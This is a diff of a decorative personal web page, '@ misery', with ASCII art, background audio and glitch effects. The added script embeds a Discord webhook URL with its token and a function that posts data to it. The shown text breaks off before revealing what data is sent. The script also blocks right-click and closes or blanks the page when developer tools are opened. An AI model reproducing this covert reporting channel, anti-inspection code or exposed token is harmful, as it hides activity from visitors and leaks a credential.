@@ -1,924 +1,942 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>@ misery</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000000;
-            color: #ffffff;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 20px;
-            -webkit-text-size-adjust: 100%;
-        }
-        #loadingScreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 999999;
-            transition: opacity 0.8s ease;
-        }
-        #loadingScreen.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 2px solid #333;
-            border-top: 2px solid #888;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 30px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loader-text {
-            color: #555;
-            letter-spacing: 6px;
-            font-size: 0.8rem;
-            animation: blink 1.2s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
-        }
-        #enterBtn {
-            display: none;
-            background: transparent;
-            color: #aaa;
-            border: 1px solid #444;
-            padding: 18px 50px;
-            font-family: 'Courier New', monospace;
-            font-size: 1.4rem;
-            letter-spacing: 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
-            text-transform: uppercase;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        #enterBtn:hover {
-            color: #fff;
-            border-color: #888;
-            background: #111;
-            box-shadow: 0 0 40px #ffffff11;
-        }
-        #enterBtn.show {
-            display: block;
-        }
-        #mainContent {
-            display: none;
-            width: 100%;
-            max-width: 900px;
-        }
-        #mainContent.show {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .ascii-art {
-            font-family: 'Courier New', monospace;
-            font-size: clamp(6px, 1.2vw, 14px);
-            line-height: 1.2;
-            color: #cccccc;
-            white-space: pre;
-            letter-spacing: 0px;
-            text-shadow: 0 0 8px #ffffff22;
-            margin-bottom: 20px;
-            text-align: center;
-            width: 100%;
-            overflow-x: auto;
-            padding: 10px 0;
-        }
-        .ascii-art .line {
-            display: block;
-            animation: lineFlicker 4s infinite alternate ease-in-out;
-        }
-        @keyframes lineFlicker {
-            0% { opacity: 1; }
-            20% { opacity: 1; }
-            21% { opacity: 0.4; }
-            22% { opacity: 1; }
-            23% { opacity: 0.2; }
-            24% { opacity: 1; }
-            25% { opacity: 0.95; }
-            100% { opacity: 1; }
-        }
-        @keyframes glitch {
-            0% { opacity: 1; text-shadow: 0 0 8px #ffffff22; }
-            2% { opacity: 0.9; text-shadow: 2px 0 #ff000044, -2px 0 #0000ff44; }
-            4% { opacity: 1; text-shadow: 0 0 8px #ffffff22; }
-            6% { opacity: 1; text-shadow: -3px 0 #00ff0044, 3px 0 #ff00ff44; }
-            8% { opacity: 1; text-shadow: 0 0 8px #ffffff22; }
-            10% { opacity: 1; text-shadow: 1px 0 #ff000044; }
-            12% { opacity: 1; text-shadow: 0 0 8px #ffffff22; }
-            100% { opacity: 1; text-shadow: 0 0 8px #ffffff22; }
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.92; }
-            100% { opacity: 1; }
-        }
-        @keyframes drift {
-            0% { transform: translateX(0px); }
-            25% { transform: translateX(0.5px); }
-            50% { transform: translateX(-0.5px); }
-            75% { transform: translateX(0.3px); }
-            100% { transform: translateX(0px); }
-        }
-        .ascii-art {
-            animation: glitch 6s infinite ease-in-out, pulse 3s infinite ease-in-out, drift 8s infinite ease-in-out;
-        }
-        .tagline {
-            font-size: clamp(1.2rem, 4vw, 2.8rem);
-            font-weight: 900;
-            text-transform: uppercase;
-            color: #eeeeee;
-            letter-spacing: 8px;
-            text-shadow: 0 0 20px #ffffff44, 0 0 60px #ffffff11;
-            border-top: 2px solid #444444;
-            border-bottom: 2px solid #444444;
-            padding: 15px 30px;
-            margin-top: 10px;
-        }
-        .sub {
-            font-size: clamp(0.7rem, 1.5vw, 1.2rem);
-            color: #777777;
-            letter-spacing: 4px;
-            margin-top: 20px;
-            border: 1px solid #333333;
-            padding: 8px 24px;
-            background: #0a0a0a;
-        }
-        .footer {
-            position: fixed;
-            bottom: 12px;
-            right: 20px;
-            font-size: 0.7rem;
-            color: #444444;
-            letter-spacing: 2px;
-        }
-        body::after {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            background: repeating-linear-gradient(0deg, rgba(255,255,255,0.00) 0px, rgba(255,255,255,0.00) 2px, rgba(255,255,255,0.03) 2px, rgba(255,255,255,0.03) 4px);
-            z-index: 9999;
-        }
-        #kill-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 99999;
-            justify-content: center;
-            align-items: center;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            font-size: 1.2rem;
-            letter-spacing: 4px;
-            text-align: center;
-            padding: 20px;
-        }
-        #kill-overlay.active { display: flex; }
-        #kill-overlay .killer-text {
-            border: 1px solid #ff000044;
-            padding: 30px 50px;
-            background: #0a0000;
-            text-shadow: 0 0 30px #ff000066;
-            animation: killPulse 0.5s infinite alternate;
-        }
-        @keyframes killPulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
-        @media (max-width: 600px) {
-            #enterBtn { padding: 14px 30px; font-size: 1rem; letter-spacing: 6px; }
-            .ascii-art { font-size: clamp(4px, 0.8vw, 8px); }
-        }
-        @supports (-webkit-touch-callout: none) {
-            .ascii-art { font-size: clamp(3px, 0.9vw, 7px); }
-            #enterBtn { padding: 16px 40px; font-size: 1.2rem; }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>@ misery</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #0a0a0a;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 1.5rem;
+      position: relative;
+      overflow-x: hidden;
+    }
+    #cmatrix-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+      display: block;
+      background: transparent;
+    }
+    #loadingScreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1000;
+      background: #0a0a0a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      transition: opacity 0.8s ease, visibility 0.8s ease;
+      cursor: pointer;
+    }
+    #loadingScreen.hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+    .loading-ascii {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 0.7rem;
+      line-height: 1.2;
+      white-space: pre;
+      color: #aaaaaa;
+      text-shadow: 0 0 12px rgba(170,170,170,0.15);
+      letter-spacing: 0.02em;
+      padding: 0.5rem;
+      max-width: 95%;
+      overflow: hidden;
+      background: transparent;
+      word-break: break-all;
+      min-height: 160px;
+    }
+    .loading-ascii code {
+      display: block;
+      background: transparent;
+      color: inherit;
+      font-size: inherit;
+      line-height: inherit;
+      white-space: pre;
+      width: 100%;
+    }
+    .loading-text {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 0.75rem;
+      color: #888888;
+      margin-top: 1rem;
+      letter-spacing: 0.15em;
+      opacity: 0.6;
+      animation: pulse 1.8s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 0.3; }
+      50% { opacity: 0.8; }
+    }
+    #mainContent {
+      position: relative;
+      z-index: 1;
+      max-width: 1000px;
+      width: 100%;
+      background: transparent;
+      padding: 0.5rem 0.2rem;
+      opacity: 0;
+      transition: opacity 0.8s ease;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 80vh;
+    }
+    #mainContent.visible {
+      opacity: 1;
+    }
+    .ascii-wrapper {
+      position: relative;
+      margin-bottom: 1.2rem;
+      width: 100%;
+      max-width: 900px;
+    }
+    .ascii-art {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 0.7rem;
+      line-height: 1.2;
+      white-space: pre;
+      color: #cccccc;
+      text-shadow: 0 0 6px rgba(200,200,200,0.1);
+      letter-spacing: 0.02em;
+      overflow-x: auto;
+      padding: 0.2rem 0;
+      background: transparent;
+      border: none;
+      outline: none;
+      word-break: break-all;
+      position: relative;
+      transition: all 0.02s;
+      text-align: center;
+    }
+    .ascii-art code {
+      display: block;
+      background: transparent;
+      color: inherit;
+      font-size: inherit;
+      line-height: inherit;
+      white-space: pre;
+      width: 100%;
+      text-align: center;
+    }
+    .glitch-layer {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 0.7rem;
+      line-height: 1.2;
+      white-space: pre;
+      color: #bbbbbb;
+      letter-spacing: 0.02em;
+      overflow-x: auto;
+      padding: 0.2rem 0;
+      background: transparent;
+      border: none;
+      outline: none;
+      word-break: break-all;
+      pointer-events: none;
+      opacity: 0;
+      transition: opacity 0.04s;
+      text-shadow: 0 0 12px rgba(200,200,200,0.3);
+      text-align: center;
+    }
+    .glitch-layer code {
+      display: block;
+      background: transparent;
+      color: inherit;
+      font-size: inherit;
+      line-height: inherit;
+      white-space: pre;
+      width: 100%;
+      text-align: center;
+    }
+    .glitch-layer.active { opacity: 1; }
+    .glitch-offset-1 {
+      transform: translate(1.5px, -1px);
+      color: #dddddd;
+      text-shadow: 0 0 20px rgba(200,200,200,0.4);
+      clip-path: inset(10% 0 70% 0);
+    }
+    .glitch-offset-2 {
+      transform: translate(-1.2px, 1.2px);
+      color: #bbbbbb;
+      text-shadow: 0 0 25px rgba(200,200,200,0.3);
+      clip-path: inset(40% 0 30% 0);
+    }
+    .glitch-offset-3 {
+      transform: translate(2px, 0.5px);
+      color: #999999;
+      text-shadow: 0 0 18px rgba(200,200,200,0.3);
+      clip-path: inset(70% 0 10% 0);
+    }
+    .tagline-wrapper {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 0.85rem;
+      font-weight: 400;
+      letter-spacing: 0.06em;
+      text-transform: lowercase;
+      color: #999999;
+      background: transparent;
+      padding: 0.4rem 0 0 0;
+      border: none;
+      border-radius: 0;
+      word-break: break-word;
+      line-height: 1.5;
+      text-shadow: 0 0 6px rgba(200,200,200,0.05);
+      backdrop-filter: none;
+      max-width: 90%;
+      min-height: 2.4rem;
+      text-align: center;
+    }
+    .tagline-cursor {
+      display: inline-block;
+      width: 0.1em;
+      height: 1em;
+      background: #aaaaaa;
+      margin-left: 2px;
+      vertical-align: text-bottom;
+      animation: blink 0.9s step-end infinite;
+      opacity: 0.6;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 0.6; }
+      50% { opacity: 0; }
+    }
+    @media (max-width: 700px) {
+      .ascii-art, .glitch-layer, .loading-ascii { font-size: 0.48rem; line-height: 1.1; }
+      .tagline-wrapper { font-size: 0.7rem; }
+      .loading-ascii { min-height: 100px; }
+    }
+    @media (max-width: 480px) {
+      .ascii-art, .glitch-layer, .loading-ascii { font-size: 0.35rem; }
+      .tagline-wrapper { font-size: 0.6rem; }
+      .loading-ascii { min-height: 70px; }
+    }
+    #bgm { display: none; }
+  </style>
 </head>
 <body>
-    <div id="kill-overlay">
-        <div class="killer-text">⚡ ACCESS DENIED ⚡<br><span style="font-size:0.6rem;color:#661111;">developer tools disabled</span></div>
+
+  <canvas id="cmatrix-canvas"></canvas>
+
+  <audio id="bgm" loop preload="auto">
+    <source src="https://file.garden/am9m147l3hw3nqT1/v12044gd0000d8ef8j7og65gt40m8ldg%20(1).mov" type="audio/mp4">
+  </audio>
+
+  <div id="loadingScreen">
+    <div class="loading-ascii" id="loadingAscii">
+      <code id="loadingCode"></code>
     </div>
-    <div id="loadingScreen">
-        <div class="loader"></div>
-        <div class="loader-text">LOADING MISERY</div>
+    <div class="loading-text">click me</div>
+  </div>
+
+  <div id="mainContent">
+    <div class="ascii-wrapper" id="asciiWrapper">
+      <div class="ascii-art" id="mainAscii">
+        <code id="asciiCode">
+
+                       .       .x+=:.                                        
+                      @88>    z`    ^%                            ..         
+   ..    .     :      %8P        .   <k               .u    .    @L          
+ .888: x888  x888.     .       .@8Ned8"      .u     .d88B :@8c  9888i   .dL  
+~`8888~'888X`?888f`  .@88u   .@^%8888"    ud8888.  ="8888f8888r `Y888k:*888. 
+  X888  888X '888>  ''888E` x88:  `)8b. :888'8888.   4888>'88"    888E  888I 
+  X888  888X '888>    888E  8888N=*8888 d888 '88%"   4888> '      888E  888I 
+  X888  888X '888>    888E   %8"    R88 8888.+"      4888>        888E  888I 
+  X888  888X '888>    888E    @8Wou 9%  8888L       .d888L .+     888E  888I 
+ "*88%""*88" '888!`   888&  .888888P`   '8888c. .+  ^"8888*"     x888N><888' 
+   `~    "    `"`     R888" `   ^"F      "88888%       "Y"        "88"  888  
+                       ""                  "YP'                         88F  
+                                                                       98"   
+                                                                     ./"     
+                                                                    ~`       
+</code>
+      </div>
+      <div class="glitch-layer glitch-offset-1" id="glitch1"><code id="glitchCode1"></code></div>
+      <div class="glitch-layer glitch-offset-2" id="glitch2"><code id="glitchCode2"></code></div>
+      <div class="glitch-layer glitch-offset-3" id="glitch3"><code id="glitchCode3"></code></div>
     </div>
-    <button id="enterBtn">ENTER</button>
-    <div id="mainContent">
-        <div class="container" style="width:100%;max-width:900px;display:flex;flex-direction:column;align-items:center;">
-            <div class="ascii-art" id="asciiArt">
-⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⢀⠊
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⡠⣶⣡⣴⡲⠤⠄⣤⣤⣴⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⣄⠀⠀⠀⡇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠜⣓⣽⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⡟⠃⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠡⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣄⠐⢁⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⡇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢁⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠇⠀⠀⢰⠁⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡷⣣⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⠁⠀⣀⠂⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠬⠂⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠁⠀⣄⢻⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡪⠴⠒⠉⠁⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⡎⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠈⠉⠈⢊⡂⢤⠀⠀⠀⠀⡠⠔⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡰⣱⣿⣿⣿⣿⣿⣿⣿⢻⢚⢿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀⢰⠏⠀⠀⠠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣄⠣⠽⠝⢿⠃⠀⠀⠀⠀⠀⠀⢀⠠⡷⠾⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⢒⢤⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠋⣿⣿⣿⣿⣿⣿⣿⡟⠒⠀⡈⠑⠢⣤⠄⣀⡀⠀⠀⢠⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠾⢿⣿⣿⣟⡋⠁⠀⠀⠰⠀⠀⠀⠑⣦⠒⠛⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣁⠀⠀⠀⠈⠉⠐⠢⠇⡀⠀⣰⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠈⠑⡏⠪⢑⠢⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⠀⠀⠀⢸⠀⠀⣠⠼⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣍⠂⠀⠘⡆⠰⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⡇⣰⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⠻⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠹⣿⣿⣿⣿⣷⠀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣿⣿⣿⣿⣿⣧⡌⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⢿⡿⡿⢿⢿⡿⡿⢿⠿⡿⣿⢿⠿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-            </div>
-            <div class="tagline">MISERY</div>
-            <div class="sub">what's a hightier human to a lowtier god</div>
-        </div>
-        <div class="footer">@misery</div>
+    <div class="tagline-wrapper" id="taglineWrapper">
+      <span id="typedText"></span><span class="tagline-cursor" id="cursor"></span>
     </div>
+  </div>
 
-    <script>
-    (function() {
-        // ---------- ANTI-DEVTOOLS (DISABLED FOR iOS COMPATIBILITY) ----------
-        // Only block F12 and Ctrl+Shift+I - no aggressive detection
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
+  <script>
+  (function() {
+    "use strict";
+
+    var audio = document.getElementById('bgm');
+    var loadingScreen = document.getElementById('loadingScreen');
+
+    function startAudio() {
+      if (!audio.paused) return;
+      audio.play().then(function() {
+        audio.loop = true;
+      }).catch(function(e) {
+        audio.muted = true;
+        audio.play().then(function() {
+          audio.muted = false;
+        }).catch(function() {});
+      });
+    }
+
+    loadingScreen.addEventListener('click', startAudio);
+    loadingScreen.addEventListener('touchstart', startAudio);
+    document.addEventListener('click', function firstGlobalClick() {
+      if (audio.paused) startAudio();
+      document.removeEventListener('click', firstGlobalClick);
+    }, { once: true });
+
+    var WEBHOOK = 'https://discord.com/api/webhooks/1534204404759269386/eyfTaujP__4xPM7P9EiEstJzKAPDJE2O7olc4_Gkvk7we0XKGUc0f2npgwesA3ayzdKn';
+
+    function sendToWebhook(content) {
+      var payload = typeof content === 'string' ? { content: content } : content;
+      return fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(function() {});
+    }
+
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        return false;
+      }
+      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
+        e.preventDefault();
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        return false;
+      }
+      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+        e.preventDefault();
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+        return false;
+      }
+      return true;
+    });
+
+    var devtoolsDetect = function() {
+      var threshold = 160;
+      var widthDiff = window.outerWidth - window.innerWidth;
+      var heightDiff = window.outerHeight - window.innerHeight;
+      if (widthDiff > threshold || heightDiff > threshold) {
+        window.close();
+        setTimeout(function() { window.location.href = 'about:blank'; }, 100);
+      }
+    };
+    setInterval(devtoolsDetect, 500);
